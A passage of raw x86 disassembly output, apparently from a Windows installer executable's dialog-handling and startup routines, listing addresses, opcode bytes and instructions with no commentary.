  404f48:	6a 13                	push   $0x13
  404f4a:	55                   	push   %ebp
  404f4b:	55                   	push   %ebp
  404f4c:	55                   	push   %ebp
  404f4d:	55                   	push   %ebp
  404f4e:	57                   	push   %edi
  404f4f:	ff 35 00 a2 43 00    	push   0x43a200
  404f55:	ff 15 e0 81 40 00    	call   *0x4081e0
  404f5b:	83 fb 05             	cmp    $0x5,%ebx
  404f5e:	75 18                	jne    0x404f78
  404f60:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404f64:	48                   	dec    %eax
  404f65:	f7 d8                	neg    %eax
  404f67:	1b c0                	sbb    %eax,%eax
  404f69:	23 c3                	and    %ebx,%eax
  404f6b:	50                   	push   %eax
  404f6c:	ff 35 00 a2 43 00    	push   0x43a200
  404f72:	ff 15 34 82 40 00    	call   *0x408234
  404f78:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  404f7e:	75 1a                	jne    0x404f9a
  404f80:	ff 35 48 85 46 00    	push   0x468548
  404f86:	ff 15 1c 82 40 00    	call   *0x40821c
  404f8c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404f90:	a3 48 85 46 00       	mov    %eax,0x468548
  404f95:	e9 03 04 00 00       	jmp    0x40539d
  404f9a:	83 fb 11             	cmp    $0x11,%ebx
  404f9d:	75 11                	jne    0x404fb0
  404f9f:	55                   	push   %ebp
  404fa0:	55                   	push   %ebp
  404fa1:	57                   	push   %edi
  404fa2:	ff 15 64 82 40 00    	call   *0x408264
  404fa8:	33 c0                	xor    %eax,%eax
  404faa:	40                   	inc    %eax
  404fab:	e9 12 04 00 00       	jmp    0x4053c2
  404fb0:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  404fb6:	0f 85 9d 00 00 00    	jne    0x405059
  404fbc:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  404fc1:	56                   	push   %esi
  404fc2:	57                   	push   %edi
  404fc3:	ff 15 60 82 40 00    	call   *0x408260
  404fc9:	8b f8                	mov    %eax,%edi
  404fcb:	3b fd                	cmp    %ebp,%edi
  404fcd:	74 1d                	je     0x404fec
  404fcf:	55                   	push   %ebp
  404fd0:	55                   	push   %ebp
  404fd1:	68 f3 00 00 00       	push   $0xf3
  404fd6:	57                   	push   %edi
  404fd7:	ff 15 78 82 40 00    	call   *0x408278
  404fdd:	57                   	push   %edi
  404fde:	ff 15 dc 81 40 00    	call   *0x4081dc
  404fe4:	85 c0                	test   %eax,%eax
  404fe6:	0f 84 d4 03 00 00    	je     0x4053c0
  404fec:	83 fe 01             	cmp    $0x1,%esi
  404fef:	75 03                	jne    0x404ff4
  404ff1:	56                   	push   %esi
  404ff2:	eb 2e                	jmp    0x405022
  404ff4:	83 fe 03             	cmp    $0x3,%esi
  404ff7:	75 0c                	jne    0x405005
  404ff9:	39 2d 14 a0 40 00    	cmp    %ebp,0x40a014
  404fff:	7e 3f                	jle    0x405040
  405001:	6a ff                	push   $0xffffffff
  405003:	eb 1d                	jmp    0x405022
  405005:	6a 02                	push   $0x2
  405007:	5f                   	pop    %edi
  405008:	3b f7                	cmp    %edi,%esi
  40500a:	75 34                	jne    0x405040
  40500c:	39 2d 4c 06 47 00    	cmp    %ebp,0x47064c
  405012:	74 15                	je     0x405029
  405014:	57                   	push   %edi
  405015:	e8 03 c4 ff ff       	call   0x40141d
  40501a:	89 3d 48 62 45 00    	mov    %edi,0x456248
  405020:	6a 78                	push   $0x78
  405022:	e8 4d e8 ff ff       	call   0x403874
  405027:	eb 30                	jmp    0x405059
  405029:	6a 03                	push   $0x3
  40502b:	e8 ed c3 ff ff       	call   0x40141d
  405030:	85 c0                	test   %eax,%eax
  405032:	75 25                	jne    0x405059
  405034:	c7 05 48 62 45 00 01 	movl   $0x1,0x456248
  40503b:	00 00 00 
  40503e:	eb e0                	jmp    0x405020
  405040:	ff 74 24 30          	push   0x30(%esp)
  405044:	ff 74 24 30          	push   0x30(%esp)
  405048:	68 11 01 00 00       	push   $0x111
  40504d:	ff 35 48 85 46 00    	push   0x468548
  405053:	ff 15 78 82 40 00    	call   *0x408278
  405059:	ff 74 24 30          	push   0x30(%esp)
  40505d:	8b c3                	mov    %ebx,%eax
  40505f:	ff 74 24 30          	push   0x30(%esp)
  405063:	e8 be e8 ff ff       	call   0x403926
  405068:	e9 55 03 00 00       	jmp    0x4053c2
  40506d:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405071:	8b 7c 24 24          	mov    0x24(%esp),%edi
  405075:	a3 dc 61 43 00       	mov    %eax,0x4361dc
  40507a:	3b d9                	cmp    %ecx,%ebx
  40507c:	75 4d                	jne    0x4050cb
  40507e:	8b 35 60 82 40 00    	mov    0x408260,%esi
  405084:	6a 01                	push   $0x1
  405086:	57                   	push   %edi
  405087:	89 3d 94 05 47 00    	mov    %edi,0x470594
  40508d:	ff d6                	call   *%esi
  40508f:	6a 02                	push   $0x2
  405091:	57                   	push   %edi
  405092:	a3 04 a2 43 00       	mov    %eax,0x43a204
  405097:	ff d6                	call   *%esi
  405099:	6a ff                	push   $0xffffffff
  40509b:	6a 1c                	push   $0x1c
  40509d:	57                   	push   %edi
  40509e:	a3 f4 a1 43 00       	mov    %eax,0x43a1f4
  4050a3:	e8 f3 e7 ff ff       	call   0x40389b
  4050a8:	ff 35 50 85 46 00    	push   0x468550
  4050ae:	6a f2                	push   $0xfffffff2
  4050b0:	57                   	push   %edi
  4050b1:	ff 15 d8 81 40 00    	call   *0x4081d8
  4050b7:	6a 04                	push   $0x4
  4050b9:	e8 5f c3 ff ff       	call   0x40141d
  4050be:	a3 54 85 46 00       	mov    %eax,0x468554
  4050c3:	33 c0                	xor    %eax,%eax
  4050c5:	40                   	inc    %eax
  4050c6:	a3 dc 61 43 00       	mov    %eax,0x4361dc
  4050cb:	8b 0d 14 a0 40 00    	mov    0x40a014,%ecx
  4050d1:	8b f1                	mov    %ecx,%esi
  4050d3:	c1 e6 06             	shl    $0x6,%esi
  4050d6:	03 35 a0 05 47 00    	add    0x4705a0,%esi
  4050dc:	33 ed                	xor    %ebp,%ebp
  4050de:	3b cd                	cmp    %ebp,%ecx
  4050e0:	7c 3e                	jl     0x405120
  4050e2:	83 f8 01             	cmp    $0x1,%eax
  4050e5:	75 31                	jne    0x405118
  4050e7:	55                   	push   %ebp
  4050e8:	ff 76 10             	push   0x10(%esi)
  4050eb:	e8 ab c2 ff ff       	call   0x40139b
  4050f0:	85 c0                	test   %eax,%eax
  4050f2:	74 24                	je     0x405118
  4050f4:	6a 01                	push   $0x1
  4050f6:	55                   	push   %ebp
  4050f7:	68 0f 04 00 00       	push   $0x40f
  4050fc:	ff 35 48 85 46 00    	push   0x468548
  405102:	ff 15 78 82 40 00    	call   *0x408278
  405108:	33 c0                	xor    %eax,%eax
  40510a:	39 2d 54 85 46 00    	cmp    %ebp,0x468554
  405110:	0f 94 c0             	sete   %al
  405113:	e9 aa 02 00 00       	jmp    0x4053c2
  405118:	39 2e                	cmp    %ebp,(%esi)
  40511a:	0f 84 a0 02 00 00    	je     0x4053c0
  405120:	68 0b 04 00 00       	push   $0x40b
  405125:	e8 e1 e7 ff ff       	call   0x40390b
  40512a:	a1 dc 61 43 00       	mov    0x4361dc,%eax
  40512f:	01 05 14 a0 40 00    	add    %eax,0x40a014
  405135:	c1 e0 06             	shl    $0x6,%eax
  405138:	03 f0                	add    %eax,%esi
  40513a:	a1 14 a0 40 00       	mov    0x40a014,%eax
  40513f:	3b 05 a4 05 47 00    	cmp    0x4705a4,%eax
  405145:	75 07                	jne    0x40514e
  405147:	6a 01                	push   $0x1
  405149:	e8 cf c2 ff ff       	call   0x40141d
  40514e:	39 2d 54 85 46 00    	cmp    %ebp,0x468554
  405154:	0f 85 24 02 00 00    	jne    0x40537e
  40515a:	a1 a4 05 47 00       	mov    0x4705a4,%eax
  40515f:	39 05 14 a0 40 00    	cmp    %eax,0x40a014
  405165:	0f 83 13 02 00 00    	jae    0x40537e
  40516b:	ff 76 24             	push   0x24(%esi)
  40516e:	8b 5e 14             	mov    0x14(%esi),%ebx
  405171:	68 f0 90 4e 00       	push   $0x4e90f0
  405176:	e8 23 0f 00 00       	call   0x40609e
  40517b:	ff 76 20             	push   0x20(%esi)
  40517e:	68 19 fc ff ff       	push   $0xfffffc19
  405183:	57                   	push   %edi
  405184:	e8 12 e7 ff ff       	call   0x40389b
  405189:	ff 76 1c             	push   0x1c(%esi)
  40518c:	68 1b fc ff ff       	push   $0xfffffc1b
  405191:	57                   	push   %edi
  405192:	e8 04 e7 ff ff       	call   0x40389b
  405197:	ff 76 28             	push   0x28(%esi)
  40519a:	68 1a fc ff ff       	push   $0xfffffc1a
  40519f:	57                   	push   %edi
  4051a0:	e8 f6 e6 ff ff       	call   0x40389b
  4051a5:	6a 03                	push   $0x3
  4051a7:	57                   	push   %edi
  4051a8:	ff 15 60 82 40 00    	call   *0x408260
  4051ae:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4051b2:	39 2d 4c 06 47 00    	cmp    %ebp,0x47064c
  4051b8:	74 09                	je     0x4051c3
  4051ba:	81 e3 fd fe ff ff    	and    $0xfffffefd,%ebx
  4051c0:	83 cb 04             	or     $0x4,%ebx
  4051c3:	8b cb                	mov    %ebx,%ecx
  4051c5:	83 e1 08             	and    $0x8,%ecx
  4051c8:	51                   	push   %ecx
  4051c9:	50                   	push   %eax
  4051ca:	ff 15 34 82 40 00    	call   *0x408234
  4051d0:	8b c3                	mov    %ebx,%eax
  4051d2:	25 00 01 00 00       	and    $0x100,%eax
  4051d7:	50                   	push   %eax
  4051d8:	ff 74 24 30          	push   0x30(%esp)
  4051dc:	ff 15 70 82 40 00    	call   *0x408270
  4051e2:	8b c3                	mov    %ebx,%eax
  4051e4:	83 e0 02             	and    $0x2,%eax
  4051e7:	50                   	push   %eax
  4051e8:	e8 f4 e6 ff ff       	call   0x4038e1
  4051ed:	83 e3 04             	and    $0x4,%ebx
  4051f0:	53                   	push   %ebx
  4051f1:	ff 35 f4 a1 43 00    	push   0x43a1f4
  4051f7:	ff 15 70 82 40 00    	call   *0x408270
  4051fd:	3b dd                	cmp    %ebp,%ebx
  4051ff:	74 03                	je     0x405204
  405201:	55                   	push   %ebp
  405202:	eb 02                	jmp    0x405206
  405204:	6a 01                	push   $0x1
  405206:	68 60 f0 00 00       	push   $0xf060
  40520b:	55                   	push   %ebp
  40520c:	57                   	push   %edi
  40520d:	ff 15 d4 81 40 00    	call   *0x4081d4
  405213:	50                   	push   %eax
  405214:	ff 15 d0 81 40 00    	call   *0x4081d0
  40521a:	8b 1d 78 82 40 00    	mov    0x408278,%ebx
  405220:	6a 01                	push   $0x1
  405222:	55                   	push   %ebp
  405223:	68 f4 00 00 00       	push   $0xf4
  405228:	ff 74 24 38          	push   0x38(%esp)
  40522c:	ff d3                	call   *%ebx
  40522e:	39 2d 4c 06 47 00    	cmp    %ebp,0x47064c
  405234:	74 13                	je     0x405249
  405236:	55                   	push   %ebp
  405237:	6a 02                	push   $0x2
  405239:	68 01 04 00 00       	push   $0x401
  40523e:	57                   	push   %edi
  40523f:	ff d3                	call   *%ebx
  405241:	ff 35 f4 a1 43 00    	push   0x43a1f4
  405247:	eb 06                	jmp    0x40524f
  405249:	ff 35 04 a2 43 00    	push   0x43a204
  40524f:	e8 a0 e6 ff ff       	call   0x4038f4
  405254:	68 80 85 46 00       	push   $0x468580
  405259:	bb 20 62 44 00       	mov    $0x446220,%ebx
  40525e:	53                   	push   %ebx
  40525f:	e8 28 08 00 00       	call   0x405a8c
  405264:	ff 76 18             	push   0x18(%esi)
  405267:	53                   	push   %ebx
  405268:	e8 35 08 00 00       	call   0x405aa2
  40526d:	8d 04 45 20 62 44 00 	lea    0x446220(,%eax,2),%eax
  405274:	50                   	push   %eax
  405275:	e8 24 0e 00 00       	call   0x40609e
  40527a:	53                   	push   %ebx
  40527b:	57                   	push   %edi
  40527c:	ff 15 28 82 40 00    	call   *0x408228
  405282:	55                   	push   %ebp
  405283:	ff 76 08             	push   0x8(%esi)
  405286:	e8 10 c1 ff ff       	call   0x40139b
  40528b:	85 c0                	test   %eax,%eax
  40528d:	0f 85 97 fe ff ff    	jne    0x40512a
  405293:	39 2e                	cmp    %ebp,(%esi)
  405295:	0f 84 8f fe ff ff    	je     0x40512a
  40529b:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  40529f:	75 1d                	jne    0x4052be
  4052a1:	39 2d 4c 06 47 00    	cmp    %ebp,0x47064c
  4052a7:	0f 85 13 01 00 00    	jne    0x4053c0
  4052ad:	39 2d 40 06 47 00    	cmp    %ebp,0x470640
  4052b3:	0f 85 71 fe ff ff    	jne    0x40512a
  4052b9:	e9 02 01 00 00       	jmp    0x4053c0
  4052be:	ff 35 48 85 46 00    	push   0x468548
  4052c4:	ff 15 1c 82 40 00    	call   *0x40821c
  4052ca:	39 2e                	cmp    %ebp,(%esi)
  4052cc:	89 35 40 62 45 00    	mov    %esi,0x456240
  4052d2:	0f 8e c5 00 00 00    	jle    0x40539d
  4052d8:	8b 46 04             	mov    0x4(%esi),%eax
  4052db:	56                   	push   %esi
  4052dc:	ff 34 85 18 a0 40 00 	push   0x40a018(,%eax,4)
  4052e3:	66 8b 06             	mov    (%esi),%ax
  4052e6:	66 03 05 5c 85 46 00 	add    0x46855c,%ax
  4052ed:	57                   	push   %edi
  4052ee:	0f b7 c0             	movzwl %ax,%eax
  4052f1:	50                   	push   %eax
  4052f2:	ff 35 98 05 47 00    	push   0x470598
  4052f8:	ff 15 20 82 40 00    	call   *0x408220
  4052fe:	a3 48 85 46 00       	mov    %eax,0x468548
  405303:	3b c5                	cmp    %ebp,%eax
  405305:	0f 84 92 00 00 00    	je     0x40539d
  40530b:	ff 76 2c             	push   0x2c(%esi)
  40530e:	6a 06                	push   $0x6
  405310:	50                   	push   %eax
  405311:	e8 85 e5 ff ff       	call   0x40389b
  405316:	8d 44 24 10          	lea    0x10(%esp),%eax
  40531a:	50                   	push   %eax
  40531b:	68 fa 03 00 00       	push   $0x3fa
  405320:	57                   	push   %edi
  405321:	ff 15 60 82 40 00    	call   *0x408260
  405327:	50                   	push   %eax
  405328:	ff 15 bc 81 40 00    	call   *0x4081bc
  40532e:	8d 44 24 10          	lea    0x10(%esp),%eax
  405332:	50                   	push   %eax
  405333:	57                   	push   %edi
  405334:	ff 15 94 81 40 00    	call   *0x408194
  40533a:	6a 15                	push   $0x15
  40533c:	55                   	push   %ebp
  40533d:	55                   	push   %ebp
  40533e:	ff 74 24 20          	push   0x20(%esp)
  405342:	ff 74 24 20          	push   0x20(%esp)
  405346:	55                   	push   %ebp
  405347:	ff 35 48 85 46 00    	push   0x468548
  40534d:	ff 15 e0 81 40 00    	call   *0x4081e0
  405353:	55                   	push   %ebp
  405354:	ff 76 0c             	push   0xc(%esi)
  405357:	e8 3f c0 ff ff       	call   0x40139b
  40535c:	39 2d 54 85 46 00    	cmp    %ebp,0x468554
  405362:	75 5c                	jne    0x4053c0
  405364:	6a 08                	push   $0x8
  405366:	ff 35 48 85 46 00    	push   0x468548
  40536c:	ff 15 34 82 40 00    	call   *0x408234
  405372:	68 05 04 00 00       	push   $0x405
  405377:	e8 8f e5 ff ff       	call   0x40390b
  40537c:	eb 1f                	jmp    0x40539d
  40537e:	ff 35 48 85 46 00    	push   0x468548
  405384:	ff 15 1c 82 40 00    	call   *0x40821c
  40538a:	ff 35 48 62 45 00    	push   0x456248
  405390:	89 2d 94 05 47 00    	mov    %ebp,0x470594
  405396:	57                   	push   %edi
  405397:	ff 15 cc 81 40 00    	call   *0x4081cc
  40539d:	39 2d 54 62 45 00    	cmp    %ebp,0x456254
  4053a3:	75 1b                	jne    0x4053c0
  4053a5:	39 2d 48 85 46 00    	cmp    %ebp,0x468548
  4053ab:	74 13                	je     0x4053c0
  4053ad:	6a 0a                	push   $0xa
  4053af:	57                   	push   %edi
  4053b0:	ff 15 34 82 40 00    	call   *0x408234
  4053b6:	c7 05 54 62 45 00 01 	movl   $0x1,0x456254
  4053bd:	00 00 00 
  4053c0:	33 c0                	xor    %eax,%eax
  4053c2:	5f                   	pop    %edi
  4053c3:	5e                   	pop    %esi
  4053c4:	5d                   	pop    %ebp
  4053c5:	5b                   	pop    %ebx
  4053c6:	83 c4 10             	add    $0x10,%esp
  4053c9:	c2 10 00             	ret    $0x10
  4053cc:	55                   	push   %ebp
  4053cd:	8b ec                	mov    %esp,%ebp
  4053cf:	83 ec 18             	sub    $0x18,%esp
  4053d2:	53                   	push   %ebx
  4053d3:	56                   	push   %esi
  4053d4:	57                   	push   %edi
  4053d5:	8b 3d 9c 05 47 00    	mov    0x47059c,%edi
  4053db:	6a 06                	push   $0x6
  4053dd:	e8 b1 07 00 00       	call   0x405b93
  4053e2:	33 db                	xor    %ebx,%ebx
  4053e4:	3b c3                	cmp    %ebx,%eax
  4053e6:	74 12                	je     0x4053fa
  4053e8:	ff d0                	call   *%eax
  4053ea:	0f b7 c0             	movzwl %ax,%eax
  4053ed:	50                   	push   %eax
  4053ee:	68 c0 10 4d 00       	push   $0x4d10c0
  4053f3:	e8 db 05 00 00       	call   0x4059d3
  4053f8:	eb 5b                	jmp    0x405455
  4053fa:	6a 30                	push   $0x30
  4053fc:	58                   	pop    %eax
  4053fd:	6a 78                	push   $0x78
  4053ff:	66 a3 c0 10 4d 00    	mov    %ax,0x4d10c0
  405405:	58                   	pop    %eax
  405406:	53                   	push   %ebx
  405407:	be 20 62 44 00       	mov    $0x446220,%esi
  40540c:	56                   	push   %esi
  40540d:	53                   	push   %ebx
  40540e:	66 a3 c2 10 4d 00    	mov    %ax,0x4d10c2
  405414:	68 d0 86 40 00       	push   $0x4086d0
  405419:	33 c0                	xor    %eax,%eax
  40541b:	68 01 00 00 80       	push   $0x80000001
  405420:	66 a3 c4 10 4d 00    	mov    %ax,0x4d10c4
  405426:	e8 2a 05 00 00       	call   0x405955
  40542b:	66 39 1d 20 62 44 00 	cmp    %bx,0x446220
  405432:	75 16                	jne    0x40544a
  405434:	53                   	push   %ebx
  405435:	56                   	push   %esi
  405436:	68 0c 87 40 00       	push   $0x40870c
  40543b:	68 80 86 40 00       	push   $0x408680
  405440:	68 03 00 00 80       	push   $0x80000003
  405445:	e8 0b 05 00 00       	call   0x405955
  40544a:	56                   	push   %esi
  40544b:	68 c0 10 4d 00       	push   $0x4d10c0
  405450:	e8 53 06 00 00       	call   0x405aa8
  405455:	e8 76 e5 ff ff       	call   0x4039d0
  40545a:	a1 e8 05 47 00       	mov    0x4705e8,%eax
  40545f:	83 e0 20             	and    $0x20,%eax
  405462:	68 a8 50 4c 00       	push   $0x4c50a8
  405467:	a3 40 06 47 00       	mov    %eax,0x470640
  40546c:	c7 05 5c 06 47 00 00 	movl   $0x10000,0x47065c
  405473:	00 01 00 
  405476:	e8 9b 0b 00 00       	call   0x406016
  40547b:	85 c0                	test   %eax,%eax
  40547d:	0f 85 94 00 00 00    	jne    0x405517
  405483:	8b 4f 48             	mov    0x48(%edi),%ecx
  405486:	3b cb                	cmp    %ebx,%ecx
  405488:	0f 84 89 00 00 00    	je     0x405517
  40548e:	a1 b8 05 47 00       	mov    0x4705b8,%eax
  405493:	8b 57 4c             	mov    0x4c(%edi),%edx
  405496:	53                   	push   %ebx
  405497:	be 00 05 46 00       	mov    $0x460500,%esi
  40549c:	56                   	push   %esi
  40549d:	8d 14 50             	lea    (%eax,%edx,2),%edx
  4054a0:	52                   	push   %edx
  4054a1:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  4054a4:	50                   	push   %eax
  4054a5:	ff 77 44             	push   0x44(%edi)
  4054a8:	e8 a8 04 00 00       	call   0x405955
  4054ad:	66 a1 00 05 46 00    	mov    0x460500,%ax
  4054b3:	66 3b c3             	cmp    %bx,%ax
  4054b6:	74 5f                	je     0x405517
  4054b8:	66 83 f8 22          	cmp    $0x22,%ax
  4054bc:	75 14                	jne    0x4054d2
  4054be:	b8 02 05 46 00       	mov    $0x460502,%eax
  4054c3:	6a 22                	push   $0x22
  4054c5:	50                   	push   %eax
  4054c6:	8b f0                	mov    %eax,%esi
  4054c8:	e8 ba 02 00 00       	call   0x405787
  4054cd:	33 c9                	xor    %ecx,%ecx
  4054cf:	66 89 08             	mov    %cx,(%eax)
  4054d2:	56                   	push   %esi
  4054d3:	e8 ca 05 00 00       	call   0x405aa2
  4054d8:	8d 44 46 f8          	lea    -0x8(%esi,%eax,2),%eax
  4054dc:	3b c6                	cmp    %esi,%eax
  4054de:	76 26                	jbe    0x405506
  4054e0:	68 74 86 40 00       	push   $0x408674
  4054e5:	50                   	push   %eax
  4054e6:	ff 15 14 81 40 00    	call   *0x408114
  4054ec:	85 c0                	test   %eax,%eax
  4054ee:	75 16                	jne    0x405506
  4054f0:	56                   	push   %esi
  4054f1:	ff 15 7c 80 40 00    	call   *0x40807c
  4054f7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4054fa:	74 04                	je     0x405500
  4054fc:	a8 10                	test   $0x10,%al
  4054fe:	75 06                	jne    0x405506
  405500:	56                   	push   %esi
  405501:	e8 e3 0a 00 00       	call   0x405fe9
  405506:	56                   	push   %esi
  405507:	e8 ae 0a 00 00       	call   0x405fba
  40550c:	50                   	push   %eax
  40550d:	68 a8 50 4c 00       	push   $0x4c50a8
  405512:	e8 75 05 00 00       	call   0x405a8c
  405517:	be a8 50 4c 00       	mov    $0x4c50a8,%esi
  40551c:	56                   	push   %esi
  40551d:	e8 f4 0a 00 00       	call   0x406016
  405522:	85 c0                	test   %eax,%eax
  405524:	75 0c                	jne    0x405532
  405526:	ff b7 18 01 00 00    	push   0x118(%edi)
  40552c:	56                   	push   %esi
  40552d:	e8 6c 0b 00 00       	call   0x40609e
  405532:	68 40 80 00 00       	push   $0x8040
  405537:	53                   	push   %ebx
  405538:	53                   	push   %ebx
  405539:	6a 01                	push   $0x1
  40553b:	6a 67                	push   $0x67
  40553d:	ff 35 98 05 47 00    	push   0x470598
  405543:	ff 15 68 82 40 00    	call   *0x408268
  405549:	a3 50 85 46 00       	mov    %eax,0x468550
  40554e:	83 7f 50 ff          	cmpl   $0xffffffff,0x50(%edi)
  405552:	be 20 85 46 00       	mov    $0x468520,%esi
  405557:	0f 84 8a 00 00 00    	je     0x4055e7
  40555d:	8b 0d 6c 86 40 00    	mov    0x40866c,%ecx
  405563:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405566:	8b 0d 70 86 40 00    	mov    0x408670,%ecx
  40556c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40556f:	8b 0d 98 05 47 00    	mov    0x470598,%ecx
  405575:	a3 34 85 46 00       	mov    %eax,0x468534
  40557a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40557d:	56                   	push   %esi
  40557e:	c7 05 24 85 46 00 00 	movl   $0x401000,0x468524
  405585:	10 40 00 
  405588:	89 0d 30 85 46 00    	mov    %ecx,0x468530
  40558e:	a3 44 85 46 00       	mov    %eax,0x468544
  405593:	ff 15 f4 81 40 00    	call   *0x4081f4
  405599:	66 85 c0             	test   %ax,%ax
  40559c:	0f 84 17 01 00 00    	je     0x4056b9
  4055a2:	53                   	push   %ebx
  4055a3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4055a6:	50                   	push   %eax
  4055a7:	53                   	push   %ebx
  4055a8:	6a 30                	push   $0x30
  4055aa:	ff 15 f0 81 40 00    	call   *0x4081f0
  4055b0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4055b3:	2b 45 ec             	sub    -0x14(%ebp),%eax
  4055b6:	53                   	push   %ebx
  4055b7:	ff 35 98 05 47 00    	push   0x470598
  4055bd:	53                   	push   %ebx
  4055be:	53                   	push   %ebx
  4055bf:	50                   	push   %eax
  4055c0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4055c3:	2b 45 e8             	sub    -0x18(%ebp),%eax
  4055c6:	50                   	push   %eax
  4055c7:	ff 75 ec             	push   -0x14(%ebp)
  4055ca:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4055cd:	ff 75 e8             	push   -0x18(%ebp)
  4055d0:	68 00 00 00 80       	push   $0x80000000
  4055d5:	53                   	push   %ebx
  4055d6:	50                   	push   %eax
  4055d7:	68 80 00 00 00       	push   $0x80
  4055dc:	ff 15 ec 81 40 00    	call   *0x4081ec
  4055e2:	a3 00 a2 43 00       	mov    %eax,0x43a200
  4055e7:	53                   	push   %ebx
  4055e8:	e8 30 be ff ff       	call   0x40141d
  4055ed:	85 c0                	test   %eax,%eax
  4055ef:	74 08                	je     0x4055f9
  4055f1:	6a 02                	push   $0x2
  4055f3:	58                   	pop    %eax
  4055f4:	e9 c2 00 00 00       	jmp    0x4056bb
  4055f9:	e8 d2 e3 ff ff       	call   0x4039d0
  4055fe:	39 1d 60 06 47 00    	cmp    %ebx,0x470660
  405604:	0f 85 86 00 00 00    	jne    0x405690
  40560a:	6a 05                	push   $0x5
  40560c:	ff 35 00 a2 43 00    	push   0x43a200
  405612:	ff 15 34 82 40 00    	call   *0x408234
  405618:	8b 3d d4 80 40 00    	mov    0x4080d4,%edi
  40561e:	68 58 86 40 00       	push   $0x408658
  405623:	ff d7                	call   *%edi
  405625:	85 c0                	test   %eax,%eax
  405627:	75 07                	jne    0x405630
  405629:	68 44 86 40 00       	push   $0x408644
  40562e:	ff d7                	call   *%edi
  405630:	8b 3d 54 82 40 00    	mov    0x408254,%edi
  405636:	56                   	push   %esi
  405637:	68 2c 86 40 00       	push   $0x40862c
  40563c:	53                   	push   %ebx
  40563d:	ff d7                	call   *%edi
  40563f:	85 c0                	test   %eax,%eax
  405641:	75 1a                	jne    0x40565d
  405643:	56                   	push   %esi
  405644:	68 18 86 40 00       	push   $0x408618
  405649:	53                   	push   %ebx
  40564a:	ff d7                	call   *%edi
  40564c:	56                   	push   %esi
  40564d:	c7 05 44 85 46 00 2c 	movl   $0x40862c,0x468544
  405654:	86 40 00 
  405657:	ff 15 f4 81 40 00    	call   *0x4081f4
  40565d:	a1 5c 85 46 00       	mov    0x46855c,%eax
  405662:	53                   	push   %ebx
  405663:	68 19 4f 40 00       	push   $0x404f19
  405668:	83 c0 69             	add    $0x69,%eax
  40566b:	0f b7 c0             	movzwl %ax,%eax
  40566e:	53                   	push   %ebx
  40566f:	50                   	push   %eax
  405670:	ff 35 98 05 47 00    	push   0x470598
  405676:	ff 15 e4 81 40 00    	call   *0x4081e4
  40567c:	6a 05                	push   $0x5
  40567e:	8b f0                	mov    %eax,%esi
  405680:	e8 98 bd ff ff       	call   0x40141d
  405685:	6a 01                	push   $0x1
  405687:	e8 38 e1 ff ff       	call   0x4037c4
  40568c:	8b c6                	mov    %esi,%eax
  40568e:	eb 2b                	jmp    0x4056bb
  405690:	53                   	push   %ebx
  405691:	e8 86 f4 ff ff       	call   0x404b1c
  405696:	85 c0                	test   %eax,%eax
  405698:	74 18                	je     0x4056b2
  40569a:	39 1d 54 85 46 00    	cmp    %ebx,0x468554
  4056a0:	0f 85 4b ff ff ff    	jne    0x4055f1
  4056a6:	6a 02                	push   $0x2
  4056a8:	e8 70 bd ff ff       	call   0x40141d
  4056ad:	e9 3f ff ff ff       	jmp    0x4055f1
  4056b2:	6a 01                	push   $0x1
  4056b4:	e8 64 bd ff ff       	call   0x40141d
  4056b9:	33 c0                	xor    %eax,%eax
  4056bb:	5f                   	pop    %edi
  4056bc:	5e                   	pop    %esi
  4056bd:	5b                   	pop    %ebx
  4056be:	c9                   	leave
  4056bf:	c3                   	ret
  4056c0:	55                   	push   %ebp
  4056c1:	8b ec                	mov    %esp,%ebp
  4056c3:	83 ec 10             	sub    $0x10,%esp
  4056c6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4056c9:	50                   	push   %eax
  4056ca:	68 58 62 45 00       	push   $0x456258
  4056cf:	33 c0                	xor    %eax,%eax
  4056d1:	50                   	push   %eax
  4056d2:	50                   	push   %eax
  4056d3:	50                   	push   %eax
  4056d4:	50                   	push   %eax
  4056d5:	50                   	push   %eax
  4056d6:	50                   	push   %eax
  4056d7:	ff 75 08             	push   0x8(%ebp)
  4056da:	c7 05 58 62 45 00 44 	movl   $0x44,0x456258
  4056e1:	00 00 00 
  4056e4:	50                   	push   %eax
  4056e5:	ff 15 d8 80 40 00    	call   *0x4080d8
  4056eb:	85 c0                	test   %eax,%eax
  4056ed:	74 0c                	je     0x4056fb
  4056ef:	ff 75 f4             	push   -0xc(%ebp)
  4056f2:	ff 15 bc 80 40 00    	call   *0x4080bc
  4056f8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4056fb:	c9                   	leave
  4056fc:	c2 04 00             	ret    $0x4
  4056ff:	ff 25 f8 81 40 00    	jmp    *0x4081f8
  405705:	68 04 20 00 00       	push   $0x2004
  40570a:	ff 74 24 0c          	push   0xc(%esp)
  40570e:	ff 74 24 0c          	push   0xc(%esp)
  405712:	ff 35 48 85 46 00    	push   0x468548
  405718:	ff 15 fc 81 40 00    	call   *0x4081fc
  40571e:	c2 08 00             	ret    $0x8
  405721:	8b 44 24 08          	mov    0x8(%esp),%eax
  405725:	8b c8                	mov    %eax,%ecx
  405727:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  40572d:	83 3d 60 06 47 00 00 	cmpl   $0x0,0x470660
  405734:	74 07                	je     0x40573d
  405736:	c1 e8 15             	shr    $0x15,%eax
  405739:	85 c0                	test   %eax,%eax
  40573b:	75 47                	jne    0x405784
  40573d:	83 3d 68 06 47 00 00 	cmpl   $0x0,0x470668
  405744:	74 06                	je     0x40574c
  405746:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  40574c:	a1 94 05 47 00       	mov    0x470594,%eax
  405751:	a3 34 a0 40 00       	mov    %eax,0x40a034
